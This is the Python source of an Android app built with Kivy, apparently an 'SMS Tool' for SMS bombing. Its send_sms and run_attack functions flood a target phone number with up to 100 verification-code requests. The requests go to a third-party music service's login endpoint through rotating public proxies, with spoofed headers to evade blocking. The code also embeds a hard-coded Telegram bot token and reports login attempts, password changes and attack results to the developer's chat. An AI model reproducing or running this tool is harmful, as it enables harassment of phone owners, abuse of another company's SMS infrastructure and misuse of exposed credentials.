#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ahmed SMS Tool - Professional Hacking Style Android App
Developer: Ahmed Nour
Website: ahmednour.vercel.app
Telegram Bot: @AhmedNourBot
"""

import kivy
kivy.require('2.2.0')

from kivy.config import Config
Config.set('graphics', 'width', '400')
Config.set('graphics', 'height', '800')
Config.set('graphics', 'resizable', False)

from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, FadeTransition
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.widget import Widget
from kivy.graphics import Color, Rectangle, Line, Ellipse
from kivy.clock import Clock
from kivy.properties import NumericProperty, ListProperty
from kivy.core.window import Window
from kivy.utils import get_color_from_hex
from kivy.metrics import dp, sp
from kivy.effects.scroll import ScrollEffect

from kivymd.app import MDApp
from kivymd.uix.screen import MDScreen
from kivymd.uix.card import MDCard
from kivymd.uix.button import MDFillRoundFlatButton
from kivymd.uix.textfield import MDTextField
from kivymd.uix.label import MDLabel
from kivymd.uix.progressbar import MDProgressBar
from kivymd.uix.boxlayout import MDBoxLayout
from kivymd.uix.floatlayout import MDFloatLayout
from kivymd.uix.gridlayout import MDGridLayout
from kivymd.uix.scrollview import MDScrollView
from kivymd.uix.behaviors import RoundedRectangularElevationBehavior

import requests
import json
import time
import random
import string
import re
import threading
from datetime import datetime

# Telegram Bot Configuration
BOT_TOKEN = "8124336394:AAFPPgpeg-0Gd-31BQMKfM4zKb7uM6crD64"
ADMIN_CHAT_ID = "201014812328"
IMMUNE_NUMBERS = ["201014812328", "01014812328"]

# Colors - Hacking Style
COLORS = {
    'primary': '#00FF41',
    'secondary': '#008F11',
    'accent': '#0D0208',
    'background': '#0A0A0A',
    'surface': '#1A1A1A',
    'error': '#FF0040',
    'warning': '#FFAA00',
    'info': '#00AAFF',
    'success': '#00FF41',
    'text': '#00FF41',
    'text_secondary': '#008F11',
}

# Proxy List
PROXIES = [
    "103.175.46.45:3128",
    "45.95.147.218:8080",
    "103.169.186.123:8080",
    "41.65.236.57:1976",
    "181.205.20.195:999",
    "190.61.88.147:8080",
    "45.174.77.1:999",
    "190.109.72.00:33633",
    "45.70.15.3:8080",
    "190.52.36.54:999",
    "200.123.15.122:999",
    "45.189.117.237:999",
    "45.189.119.42:999",
    "45.189.119.111:999",
    "45.189.119.112:999"
]

# Target URL
TARGET_URL = "https://api.twistmena.com/music/Dlogin/sendCode"

# Global password storage
CURRENT_PASSWORD = "a"

class AnimatedBackground(Widget):
    """Animated background with particles"""
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.particles = []
        self.num_particles = 25
        self.init_particles()
        Clock.schedule_interval(self.update, 0.033)
    
    def init_particles(self):
        for i in range(self.num_particles):
            self.particles.append({
                'x': random.random(),
                'y': random.random(),
                'size': random.uniform(1, 3),
                'speed_x': random.uniform(-0.001, 0.001),
                'speed_y': random.uniform(-0.001, 0.001),
                'opacity': random.uniform(0.1, 0.5)
            })
    
    def update(self, dt):
        self.canvas.clear()
        with self.canvas:
            Color(0.04, 0.04, 0.04, 1)
            Rectangle(pos=self.pos, size=self.size)
            
            Color(0, 0.25, 0, 0.08)
            grid_size = dp(50)
            for x in range(0, int(self.width), int(grid_size)):
                Line(points=[x, 0, x, self.height], width=0.5)
            for y in range(0, int(self.height), int(grid_size)):
                Line(points=[0, y, self.width, y], width=0.5)
            
            for p in self.particles:
                p['x'] += p['speed_x']
                p['y'] += p['speed_y']
                
                if p['x'] < 0 or p['x'] > 1:
                    p['speed_x'] *= -1
                if p['y'] < 0 or p['y'] > 1:
                    p['speed_y'] *= -1
                
                Color(0, 1, 0.25, p['opacity'])
                size = dp(p['size'])
                Ellipse(pos=(p['x'] * self.width - size/2, p['y'] * self.height - size/2), 
                       size=(size, size))

class GlowingLabel(MDLabel):
    """Label with glow effect"""
    glow_intensity = NumericProperty(0.5)
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        Clock.schedule_interval(self.animate_glow, 0.1)
        self.glow_direction = 1
    
    def animate_glow(self, dt):
        self.glow_intensity += 0.02 * self.glow_direction
        if self.glow_intensity >= 1:
            self.glow_direction = -1
        elif self.glow_intensity <= 0.3:
            self.glow_direction = 1

class HackerButton(MDFillRoundFlatButton):
    """Custom hacker-style button"""
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.md_bg_color = get_color_from_hex('#003B00')
        self.text_color = get_color_from_hex(COLORS['primary'])
        self.font_size = sp(14)
        self.size_hint = (1, None)
        self.height = dp(48)
        
    def on_press(self):
        self.md_bg_color = get_color_from_hex(COLORS['primary'])
        self.text_color = get_color_from_hex(COLORS['accent'])
        
    def on_release(self):
        self.md_bg_color = get_color_from_hex('#003B00')
        self.text_color = get_color_from_hex(COLORS['primary'])

class HackerTextField(MDTextField):
    """Custom hacker-style text field"""
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.text_color_normal = get_color_from_hex(COLORS['primary'])
        self.text_color_focus = get_color_from_hex(COLORS['primary'])
        self.hint_text_color_normal = get_color_from_hex(COLORS['text_secondary'])
        self.hint_text_color_focus = get_color_from_hex(COLORS['primary'])
        self.line_color_normal = get_color_from_hex(COLORS['secondary'])
        self.line_color_focus = get_color_from_hex(COLORS['primary'])
        self.fill_color_normal = get_color_from_hex(COLORS['surface'])
        self.fill_color_focus = get_color_from_hex('#0D1F0D')
        self.mode = "fill"
        self.size_hint = (1, None)
        self.height = dp(55)
        self.font_size = sp(14)

class HackerCard(MDCard, RoundedRectangularElevationBehavior):
    """Hacker-style card"""
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.md_bg_color = get_color_from_hex(COLORS['surface'])
        self.radius = [dp(12), dp(12), dp(12), dp(12)]
        self.elevation = 6
        self.padding = dp(15)
        self.spacing = dp(12)
        self.size_hint = (1, None)

class LoginScreen(MDScreen):
    """Login screen with password verification"""
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.build_ui()
    
    def build_ui(self):
        main_layout = MDFloatLayout()
        
        self.bg = AnimatedBackground()
        main_layout.add_widget(self.bg)
        
        content = MDBoxLayout(
            orientation='vertical',
            padding=dp(20),
            spacing=dp(15),
            size_hint=(0.92, 0.85),
            pos_hint={'center_x': 0.5, 'center_y': 0.5}
        )
        
        # Logo
        logo_container = MDBoxLayout(
            size_hint=(1, None),
            height=dp(120),
            padding=dp(15)
        )
        
        self.logo_label = GlowingLabel(
            text="[ A N O U R ]",
            font_style='H4',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['primary']),
            size_hint=(1, 1)
        )
        logo_container.add_widget(self.logo_label)
        content.add_widget(logo_container)
        
        subtitle = MDLabel(
            text="SECURE ACCESS SYSTEM",
            font_style='Caption',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['text_secondary']),
            size_hint=(1, None),
            height=dp(25)
        )
        content.add_widget(subtitle)
        
        content.add_widget(Widget(size_hint=(1, None), height=dp(25)))
        
        # Login Card
        login_card = HackerCard()
        login_card.height = dp(260)
        
        card_content = MDBoxLayout(
            orientation='vertical',
            spacing=dp(12),
            padding=dp(10)
        )
        
        card_title = MDLabel(
            text="AUTHENTICATION",
            font_style='H6',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['primary']),
            size_hint=(1, None),
            height=dp(35)
        )
        card_content.add_widget(card_title)
        
        self.password_field = HackerTextField(
            hint_text="Enter Access Code",
            password=True,
            icon_left="lock",
            helper_text="Password from Telegram Bot"
        )
        card_content.add_widget(self.password_field)
        
        self.login_btn = HackerButton(
            text="ACCESS SYSTEM",
            on_release=self.verify_password
        )
        card_content.add_widget(self.login_btn)
        
        self.status_label = MDLabel(
            text="",
            font_style='Caption',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['error']),
            size_hint=(1, None),
            height=dp(25)
        )
        card_content.add_widget(self.status_label)
        
        login_card.add_widget(card_content)
        content.add_widget(login_card)
        
        # Developer info
        dev_info = MDLabel(
            text="Developer: Ahmed Nour\nahmednour.vercel.app",
            font_style='Caption',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['text_secondary']),
            size_hint=(1, None),
            height=dp(45)
        )
        content.add_widget(dev_info)
        
        main_layout.add_widget(content)
        self.add_widget(main_layout)
        
        Window.bind(size=self.on_window_size)
    
    def on_window_size(self, instance, value):
        if hasattr(self, 'bg'):
            self.bg.size = value
    
    def verify_password(self, instance):
        password = self.password_field.text.strip()
        
        if not password:
            self.status_label.text = "Please enter password"
            return
        
        # Check admin command
        if password.startswith("pass="):
            new_pass = password.replace("pass=", "").strip()
            if new_pass:
                global CURRENT_PASSWORD
                CURRENT_PASSWORD = new_pass
                self.send_telegram_message(f"Password changed to: {new_pass}")
                self.status_label.text = "Password updated!"
                self.status_label.text_color = get_color_from_hex(COLORS['success'])
                return
        
        if password == CURRENT_PASSWORD:
            self.status_label.text = "Access Granted!"
            self.status_label.text_color = get_color_from_hex(COLORS['success'])
            Clock.schedule_once(self.go_to_main, 0.5)
        else:
            self.status_label.text = "Invalid Password!"
            self.status_label.text_color = get_color_from_hex(COLORS['error'])
            self.send_telegram_message(f"Failed login attempt: {password}")
    
    def send_telegram_message(self, message):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {
                'chat_id': ADMIN_CHAT_ID,
                'text': message,
                'parse_mode': 'HTML'
            }
            threading.Thread(target=lambda: requests.post(url, data=data, timeout=5)).start()
        except:
            pass
    
    def go_to_main(self, dt):
        self.manager.current = 'main'

class MainScreen(MDScreen):
    """Main screen for SMS operations"""
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.is_running = False
        self.success_count = 0
        self.failure_count = 0
        self.build_ui()
    
    def build_ui(self):
        main_layout = MDFloatLayout()
        
        self.bg = AnimatedBackground()
        main_layout.add_widget(self.bg)
        
        scroll = MDScrollView(
            size_hint=(1, 1),
            effect_cls=ScrollEffect
        )
        
        content = MDBoxLayout(
            orientation='vertical',
            padding=dp(15),
            spacing=dp(12),
            size_hint=(1, None)
        )
        content.bind(minimum_height=content.setter('height'))
        
        # Header
        header = MDBoxLayout(
            orientation='vertical',
            size_hint=(1, None),
            height=dp(100),
            padding=dp(10)
        )
        
        title = GlowingLabel(
            text="[ SMS TOOL ]",
            font_style='H4',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['primary'])
        )
        header.add_widget(title)
        
        subtitle = MDLabel(
            text="Advanced Messaging System",
            font_style='Caption',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['text_secondary'])
        )
        header.add_widget(subtitle)
        
        content.add_widget(header)
        
        # Input Card
        input_card = HackerCard()
        input_card.height = dp(360)
        
        input_content = MDBoxLayout(
            orientation='vertical',
            spacing=dp(10),
            padding=dp(12)
        )
        
        input_title = MDLabel(
            text="TARGET CONFIGURATION",
            font_style='H6',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['primary']),
            size_hint=(1, None),
            height=dp(35)
        )
        input_content.add_widget(input_title)
        
        self.country_code = HackerTextField(
            hint_text="Country Code (e.g., 20)",
            icon_left="earth",
            text="20"
        )
        input_content.add_widget(self.country_code)
        
        self.phone_number = HackerTextField(
            hint_text="Phone Number",
            icon_left="phone"
        )
        input_content.add_widget(self.phone_number)
        
        self.sms_count = HackerTextField(
            hint_text="Messages (1-100)",
            icon_left="message",
            text="10"
        )
        input_content.add_widget(self.sms_count)
        
        warning = MDLabel(
            text="For educational purposes only",
            font_style='Caption',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['warning']),
            size_hint=(1, None),
            height=dp(25)
        )
        input_content.add_widget(warning)
        
        btn_layout = MDBoxLayout(
            orientation='horizontal',
            spacing=dp(8),
            size_hint=(1, None),
            height=dp(45)
        )
        
        self.start_btn = HackerButton(
            text="START",
            on_release=self.start_attack
        )
        btn_layout.add_widget(self.start_btn)
        
        self.stop_btn = HackerButton(
            text="STOP",
            on_release=self.stop_attack,
            md_bg_color=get_color_from_hex(COLORS['error'])
        )
        self.stop_btn.disabled = True
        btn_layout.add_widget(self.stop_btn)
        
        input_content.add_widget(btn_layout)
        input_card.add_widget(input_content)
        content.add_widget(input_card)
        
        # Progress Card
        progress_card = HackerCard()
        progress_card.height = dp(180)
        
        progress_content = MDBoxLayout(
            orientation='vertical',
            spacing=dp(8),
            padding=dp(12)
        )
        
        progress_title = MDLabel(
            text="PROGRESS",
            font_style='H6',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['primary']),
            size_hint=(1, None),
            height=dp(30)
        )
        progress_content.add_widget(progress_title)
        
        self.progress_bar = MDProgressBar(
            value=0,
            color=get_color_from_hex(COLORS['primary']),
            back_color=get_color_from_hex(COLORS['surface'])
        )
        progress_content.add_widget(self.progress_bar)
        
        stats_layout = MDGridLayout(
            cols=3,
            spacing=dp(8),
            size_hint=(1, None),
            height=dp(60)
        )
        
        self.success_label = MDLabel(
            text="Success: 0",
            font_style='Body2',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['success'])
        )
        stats_layout.add_widget(self.success_label)
        
        self.failed_label = MDLabel(
            text="Failed: 0",
            font_style='Body2',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['error'])
        )
        stats_layout.add_widget(self.failed_label)
        
        self.progress_label = MDLabel(
            text="0/0",
            font_style='Body2',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['info'])
        )
        stats_layout.add_widget(self.progress_label)
        
        progress_content.add_widget(stats_layout)
        
        self.status_msg = MDLabel(
            text="Ready",
            font_style='Caption',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['text_secondary']),
            size_hint=(1, None),
            height=dp(25)
        )
        progress_content.add_widget(self.status_msg)
        
        progress_card.add_widget(progress_content)
        content.add_widget(progress_card)
        
        # Log Card
        log_card = HackerCard()
        log_card.height = dp(200)
        
        log_content = MDBoxLayout(
            orientation='vertical',
            spacing=dp(8),
            padding=dp(12)
        )
        
        log_title = MDLabel(
            text="ACTIVITY LOG",
            font_style='H6',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['primary']),
            size_hint=(1, None),
            height=dp(30)
        )
        log_content.add_widget(log_title)
        
        log_scroll = MDScrollView(
            size_hint=(1, 1),
            effect_cls=ScrollEffect
        )
        
        self.log_label = MDLabel(
            text="System initialized...",
            font_style='Caption',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['text_secondary']),
            size_hint=(1, None),
            markup=True
        )
        self.log_label.bind(texture_size=self.log_label.setter('size'))
        log_scroll.add_widget(self.log_label)
        log_content.add_widget(log_scroll)
        
        log_card.add_widget(log_content)
        content.add_widget(log_card)
        
        # Bottom buttons
        bottom_layout = MDBoxLayout(
            orientation='horizontal',
            spacing=dp(8),
            size_hint=(1, None),
            height=dp(45),
            padding=dp(5)
        )
        
        settings_btn = HackerButton(
            text="SETTINGS",
            on_release=lambda x: setattr(self.manager, 'current', 'settings')
        )
        bottom_layout.add_widget(settings_btn)
        
        about_btn = HackerButton(
            text="ABOUT",
            on_release=lambda x: setattr(self.manager, 'current', 'about')
        )
        bottom_layout.add_widget(about_btn)
        
        content.add_widget(bottom_layout)
        
        # Footer
        footer = MDLabel(
            text="2024 Ahmed Nour - ahmednour.vercel.app",
            font_style='Caption',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['text_secondary']),
            size_hint=(1, None),
            height=dp(35)
        )
        content.add_widget(footer)
        
        scroll.add_widget(content)
        main_layout.add_widget(scroll)
        self.add_widget(main_layout)
    
    def log_message(self, message, color='text_secondary'):
        timestamp = datetime.now().strftime("%H:%M:%S")
        color_hex = COLORS.get(color, COLORS['text_secondary'])
        current_text = self.log_label.text
        new_line = f"\n[{timestamp}] {message}"
        self.log_label.text = current_text + new_line
    
    def start_attack(self, instance):
        country = self.country_code.text.strip()
        phone = self.phone_number.text.strip()
        count_str = self.sms_count.text.strip()
        
        if not country or not country.isdigit():
            self.show_error("Invalid country code")
            return
        
        if not phone or not phone.isdigit():
            self.show_error("Invalid phone number")
            return
        
        try:
            count = int(count_str)
            if count < 1 or count > 100:
                raise ValueError()
        except:
            self.show_error("Count must be 1-100")
            return
        
        full_number = country + phone
        if full_number in IMMUNE_NUMBERS or phone in IMMUNE_NUMBERS:
            self.show_error("Protected number!")
            self.log_message("BLOCKED - Protected", 'error')
            return
        
        self.is_running = True
        self.start_btn.disabled = True
        self.stop_btn.disabled = False
        self.success_count = 0
        self.failure_count = 0
        
        self.log_message(f"Starting: +{full_number}", 'primary')
        
        self.attack_thread = threading.Thread(
            target=self.run_attack,
            args=(full_number, count)
        )
        self.attack_thread.daemon = True
        self.attack_thread.start()
    
    def run_attack(self, full_number, count):
        for i in range(1, count + 1):
            if not self.is_running:
                break
            
            success = self.send_sms(full_number)
            
            if success:
                self.success_count += 1
            else:
                self.failure_count += 1
            
            Clock.schedule_once(lambda dt, s=success, idx=i, total=count: self.update_progress(s, idx, total), 0)
            
            if i < count and self.is_running:
                time.sleep(3)
        
        Clock.schedule_once(self.attack_finished, 0)
    
    def send_sms(self, formatted_number):
        try:
            proxy = {"http": f"http://{random.choice(PROXIES)}"} if PROXIES else None
            
            payload = json.dumps({
                "dial": formatted_number,
                "randomValue": ''.join(random.choices(string.ascii_letters + string.digits, k=12)),
                "timestamp": int(time.time() * 1000)
            })
            
            headers = {
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15",
                    "Mozilla/5.0 (Linux; Android 12; SM-S906N)"
                ]),
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Referer": random.choice([
                    "https://www.google.com",
                    "https://www.bing.com"
                ]),
                "Connection": "keep-alive",
                "X-Requested-With": "XMLHttpRequest"
            }
            
            response = requests.post(
                TARGET_URL, 
                headers=headers, 
                data=payload, 
                proxies=proxy, 
                timeout=10
            )
            return response.status_code == 200
                    
        except:
            return False
    
    def update_progress(self, success, current, total):
        progress = (current / total) * 100
        self.progress_bar.value = progress
        
        self.success_label.text = f"Success: {self.success_count}"
        self.failed_label.text = f"Failed: {self.failure_count}"
        self.progress_label.text = f"{current}/{total}"
        
        status = "SENT" if success else "FAILED"
        color = 'success' if success else 'error'
        self.log_message(f"{current}/{total}: {status}", color)
        
        self.status_msg.text = f"Processing... {progress:.0f}%"
    
    def attack_finished(self, dt):
        self.is_running = False
        self.start_btn.disabled = False
        self.stop_btn.disabled = True
        
        total = self.success_count + self.failure_count
        success_rate = (self.success_count / total * 100) if total > 0 else 0
        
        self.log_message("=" * 20, 'primary')
        self.log_message("COMPLETED", 'primary')
        self.log_message(f"Rate: {success_rate:.0f}%", 'success' if success_rate > 50 else 'warning')
        
        self.status_msg.text = "Completed!"
        self.send_telegram_notification()
    
    def send_telegram_notification(self):
        try:
            message = f"""SMS Attack Completed

Success: {self.success_count}
Failed: {self.failure_count}
Total: {self.success_count + self.failure_count}
Time: {datetime.now().strftime('%H:%M:%S')}

Ahmed Nour"""
            
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {
                'chat_id': ADMIN_CHAT_ID,
                'text': message,
                'parse_mode': 'HTML'
            }
            threading.Thread(target=lambda: requests.post(url, data=data, timeout=5)).start()
        except:
            pass
    
    def stop_attack(self, instance):
        self.is_running = False
        self.log_message("Stopped by user", 'warning')
        self.status_msg.text = "Stopped!"
    
    def show_error(self, message):
        self.log_message(message, 'error')
        self.status_msg.text = message
        self.status_msg.text_color = get_color_from_hex(COLORS['error'])

class SettingsScreen(MDScreen):
    """Settings screen"""
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.build_ui()
    
    def build_ui(self):
        main_layout = MDFloatLayout()
        
        self.bg = AnimatedBackground()
        main_layout.add_widget(self.bg)
        
        content = MDBoxLayout(
            orientation='vertical',
            padding=dp(20),
            spacing=dp(15),
            size_hint=(0.92, 0.88),
            pos_hint={'center_x': 0.5, 'center_y': 0.5}
        )
        
        header = MDBoxLayout(
            orientation='vertical',
            size_hint=(1, None),
            height=dp(90),
            padding=dp(10)
        )
        
        title = GlowingLabel(
            text="[ SETTINGS ]",
            font_style='H4',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['primary'])
        )
        header.add_widget(title)
        content.add_widget(header)
        
        settings_card = HackerCard()
        settings_card.height = dp(350)
        
        settings_content = MDBoxLayout(
            orientation='vertical',
            spacing=dp(12),
            padding=dp(15)
        )
        
        self.current_pass_label = MDLabel(
            text=f"Current: {CURRENT_PASSWORD}",
            font_style='H6',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['primary']),
            size_hint=(1, None),
            height=dp(40)
        )
        settings_content.add_widget(self.current_pass_label)
        
        self.new_password = HackerTextField(
            hint_text="New Password",
            icon_left="key",
            password=True
        )
        settings_content.add_widget(self.new_password)
        
        change_btn = HackerButton(
            text="CHANGE PASSWORD",
            on_release=self.change_password
        )
        settings_content.add_widget(change_btn)
        
        settings_content.add_widget(Widget(size_hint=(1, None), height=dp(15)))
        
        info_title = MDLabel(
            text="APP INFO",
            font_style='H6',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['info']),
            size_hint=(1, None),
            height=dp(35)
        )
        settings_content.add_widget(info_title)
        
        info_text = MDLabel(
            text="Version: 1.0.0\nDeveloper: Ahmed Nour\nahmednour.vercel.app\n@AhmedNourBot",
            font_style='Body2',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['text_secondary']),
            size_hint=(1, None),
            height=dp(90)
        )
        settings_content.add_widget(info_text)
        
        settings_card.add_widget(settings_content)
        content.add_widget(settings_card)
        
        back_btn = HackerButton(
            text="BACK TO MAIN",
            on_release=lambda x: setattr(self.manager, 'current', 'main')
        )
        content.add_widget(back_btn)
        
        main_layout.add_widget(content)
        self.add_widget(main_layout)
    
    def change_password(self, instance):
        new_pass = self.new_password.text.strip()
        if new_pass:
            global CURRENT_PASSWORD
            CURRENT_PASSWORD = new_pass
            self.current_pass_label.text = f"Current: {CURRENT_PASSWORD}"
            self.new_password.text = ""
            
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                data = {
                    'chat_id': ADMIN_CHAT_ID,
                    'text': f"Password changed to: {new_pass}",
                    'parse_mode': 'HTML'
                }
                threading.Thread(target=lambda: requests.post(url, data=data, timeout=5)).start()
            except:
                pass

class AboutScreen(MDScreen):
    """About screen"""
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.build_ui()
    
    def build_ui(self):
        main_layout = MDFloatLayout()
        
        self.bg = AnimatedBackground()
        main_layout.add_widget(self.bg)
        
        content = MDBoxLayout(
            orientation='vertical',
            padding=dp(20),
            spacing=dp(15),
            size_hint=(0.92, 0.88),
            pos_hint={'center_x': 0.5, 'center_y': 0.5}
        )
        
        header = MDBoxLayout(
            orientation='vertical',
            size_hint=(1, None),
            height=dp(90),
            padding=dp(10)
        )
        
        title = GlowingLabel(
            text="[ ABOUT ]",
            font_style='H4',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['primary'])
        )
        header.add_widget(title)
        content.add_widget(header)
        
        about_card = HackerCard()
        about_card.height = dp(420)
        
        about_content = MDBoxLayout(
            orientation='vertical',
            spacing=dp(12),
            padding=dp(15)
        )
        
        logo = MDLabel(
            text="[ A N O U R ]",
            font_style='H3',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['primary']),
            size_hint=(1, None),
            height=dp(50)
        )
        about_content.add_widget(logo)
        
        desc = MDLabel(
            text="SMS Tool",
            font_style='H5',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['info']),
            size_hint=(1, None),
            height=dp(35)
        )
        about_content.add_widget(desc)
        
        details = MDLabel(
            text="""
Version: 1.0.0
Developer: Ahmed Nour
ahmednour.vercel.app

DISCLAIMER:
For educational purposes only.
Developer not responsible for misuse.

Protected Numbers:
201014812328
01014812328

2024 All Rights Reserved
            """,
            font_style='Body2',
            halign='center',
            theme_text_color='Custom',
            text_color=get_color_from_hex(COLORS['text_secondary']),
            size_hint=(1, None),
            height=dp(240)
        )
        about_content.add_widget(details)
        
        about_card.add_widget(about_content)
        content.add_widget(about_card)
        
        back_btn = HackerButton(
            text="BACK TO MAIN",
            on_release=lambda x: setattr(self.manager, 'current', 'main')
        )
        content.add_widget(back_btn)
        
        main_layout.add_widget(content)
        self.add_widget(main_layout)

class AhmedSMSApp(MDApp):
    """Main Application"""
    def build(self):
        self.theme_cls.theme_style = "Dark"
        self.theme_cls.primary_palette = "Green"
        self.theme_cls.accent_palette = "LightGreen"
        
        sm = ScreenManager(transition=FadeTransition())
        
        sm.add_widget(LoginScreen(name='login'))
        sm.add_widget(MainScreen(name='main'))
        sm.add_widget(SettingsScreen(name='settings'))
        sm.add_widget(AboutScreen(name='about'))
        
        return sm

if __name__ == '__main__':
    AhmedSMSApp().run()
